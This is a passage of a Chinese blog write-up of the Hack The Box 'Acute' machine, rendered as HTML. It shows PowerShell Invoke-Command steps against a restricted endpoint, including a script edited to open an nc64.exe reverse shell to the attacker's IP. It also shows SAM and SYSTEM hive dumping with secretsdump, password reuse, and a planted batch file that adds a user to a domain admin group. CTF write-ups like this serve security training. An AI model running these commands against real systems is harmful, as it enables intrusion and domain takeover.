+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820183038.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>如gpt所言，用<code>Invoke-Command</code> 远程加载运行代码时，它会在一个新的上下文中执行，从而绕过<code>dc_manage</code>的限制</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820183324.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>现在我们获得了一个<code>ATSSERVER</code>机器的初始权限，以imonks的身份</p>
+</blockquote>
+<h3 id="jmorgan-Acute-PC01"><a href="#jmorgan-Acute-PC01" class="headerlink" title="jmorgan@Acute-PC01"></a>jmorgan@Acute-PC01</h3><p>在这种受限的条件下枚举可用命令是十分有必要的（包括alias）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">Get-Command</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820193345.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>在检索该用户桌面时还发现了一个脚本文件：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820195913.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$securepasswd</span> = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$securepasswd</span> | <span class="hljs-built_in">ConvertTo-SecureString</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, <span class="hljs-variable">$passwd</span>)<br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Get-Volume</span>&#125; <span class="hljs-literal">-ComputerName</span> Acute<span class="hljs-literal">-PC01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在<code>Acute-PC01</code>上逐行执行，尝试获得凭据</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820205550.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>很遗憾但是在情理之中的失败，显然是因为安全密码字符串是使用仅在被加密的计算机上可用的信息进行加密的</p>
+</blockquote>
+<blockquote>
+<p>那么我们现在其实只能通过之前的命令去<code>ATSSERVER</code>上执行该脚本</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; C:\users\imonks\desktop\wm.ps1 &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820210222.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>这里执行的是写好的<code>Get-Volume</code>命令，那么我们很自然的可以想到替换成反射shell语句，来拿到<code>acute\jmorgan</code>在<code>Acute-PC01</code>上的shell</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-variable">$securepasswd</span> = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c 0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span>; <span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$securepasswd</span> | <span class="hljs-built_in">ConvertTo-SecureString</span>; <span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, <span class="hljs-variable">$passwd</span>); <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Get-Volume</span>&#125; <span class="hljs-literal">-ComputerName</span> Acute<span class="hljs-literal">-PC01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820211948.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>一如我们在之前查看的，可用的cmdlet并没有ConvertTo-SecureString<br>但很矛盾的是我们上一步中已经成功执行了该脚本</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820212422.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>根据gpt的说法，可能是该脚本的缓存机制导致了脚本中可用ConvertTo-SecureString<br>而且幸运的是，这个脚本就在我们可控用户的桌面，它是可控的<br>同时由于Set-Content这个cmdlet可用，所以我们可以很轻松的将其修改为反弹shell语句</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; ((<span class="hljs-built_in">cat</span> ..\desktop\wm.ps1 <span class="hljs-literal">-Raw</span>) <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;Get-Volume&#x27;</span>, <span class="hljs-string">&#x27;C:\utils\nc64.exe -e cmd 10.10.16.8 9999&#x27;</span>) | <span class="hljs-built_in">sc</span> <span class="hljs-literal">-Path</span> ..\desktop\wm.ps1 &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820213531.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820213736.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>至此拿到了<code>jmorgan</code>在Acute-PC01的立足点</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820215414.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="awallace-ATSSERVER"><a href="#awallace-ATSSERVER" class="headerlink" title="awallace@ATSSERVER"></a>awallace@ATSSERVER</h3><blockquote>
+<p>很遗憾，即使我们已经是<code>BUILTIN\Administrators</code>的成员，但仍然不够，<code>c:\users\administrator\desktop\root.txt</code>并不在这台机子，还需要进一步提权到域管理组去疑似域控的<code>ATSSERVER</code>寻找</p>
+</blockquote>
+<blockquote>
+<p>现在我们手上有一个本地管理员用户，不管怎样我们都应该优先转储哈希</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg save HKLM\system sys.bak<br>reg save HKLM\sam sam.bak<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">secretsdump.py -sam sam.bak -system sys.bak LOCAL<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821105401.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>获得了Guest是空密码和Administrator是<code>Password@123</code><br>在任何情况下获得新的密码时，尝试密码复用都是很有必要的</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;Password@123&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span> <br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\awallace&quot;</span>, <span class="hljs-variable">$pass</span>)<br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110102.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>事实上，该密码被awallace在ATSSERVER上使用</p>
+</blockquote>
+<blockquote>
+<p>我们现在又回到了这台受限制的机子<code>ATSSERVER</code>，以awallace的身份<br>和之前一样，还是做一些必要的探索：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110407.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>就cmdlet来说还是一样的苛刻</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">ls</span> <span class="hljs-string">&#x27;\program files\keepmeon&#x27;</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110726.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>不同的是，这次可以对神秘的program <code>keepmeon</code>访问了</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-comment">REM This is run every 5 minutes. For Lois use ONLY</span><br>@<span class="hljs-built_in">echo</span> off<br> <span class="hljs-keyword">for</span> /R <span class="hljs-variable">%%x</span> <span class="hljs-keyword">in</span> (*.bat) <span class="hljs-keyword">do</span> ( <br> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> &quot;<span class="hljs-variable">%%x</span>&quot; == &quot;%~<span class="hljs-number">0</span>&quot; <span class="hljs-keyword">call</span> &quot;<span class="hljs-variable">%%x</span>&quot;<br> )<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看起来我们的网站管理员lois会定时执行这个文件，文件本身是用来执行除自己外的bat文件<br>让我们先来查看lois(网站管理员)能做什么：</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; net <span class="hljs-built_in">group</span> /domain &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; net <span class="hljs-built_in">group</span> Site_Admin /domain &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821111157.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>对于<code>Site_Admin</code>组的描述是紧急情况下的可访问域管理员组<br>此时思路已经明了，我选择将我们控制的awallace加入<code>site_admin</code>组</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;\program files\keepmeon\fy.bat&#x27;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&#x27;net group site_admin awallace /add /domain&#x27;</span>&#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>添加上述bat文件，loris会替我们执行它</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821112612.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>为了保险起见我还添加了jmorgan测试<br>现在我们应该已经可以读到<code>c\users\administrator\desktop\root.txt</code></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">cat</span> <span class="hljs-string">&#x27;c:\users\administrator\desktop\root.txt&#x27;</span>  &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://fyhypo.github.io/uncategorized/Acute/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FYHypo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/uncategorized/Driver/" title="HTB Driver">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Driver</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/test/test/1111/" title="test">
+                        <span class="hidden-mobile">test</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>FYHypo</span></a> <i class="iconfont icon-love"></i> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/custom.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
